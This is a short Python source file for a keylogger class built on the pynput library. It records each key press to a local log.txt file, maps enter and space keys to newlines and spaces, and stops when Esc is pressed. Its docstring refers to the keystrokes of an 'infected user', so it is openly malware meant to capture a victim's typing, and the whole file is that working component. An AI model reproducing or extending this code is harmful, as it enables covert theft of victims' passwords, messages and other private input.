import datetime
from pynput.keyboard import Key


class Keylogger():

    def __init__(self, lock):

        self.keys = []
        self.lock = lock
        now = datetime.datetime.now()
        f = open("log.txt", "w")
        f.write("---START--- Date: {}\n".format(now))

    def on_press(self, key):

        self.keys.append(key)
        self.write_file()
        self.keys = []

    def on_release(self, key):

        if key == Key.esc:
            return False

    def write_file(self):
        """Write a function with the keystrokes made by infected user"""

        self.lock.acquire()

        try:
            with open("log.txt", "a+") as f:
                for key in self.keys:
                    k = str(key).replace("'", "")
                    if k.find("enter") > 0:
                        f.write('\n')
                    elif k.find("space") > 0:
                        f.write(" ")
                    elif k.find("Key") == -1:
                        f.write(k)
        except FileNotFoundError:
            print("File not found. \n Closing", end="")
        else:
            f.close()
        finally:
            self.lock.release()
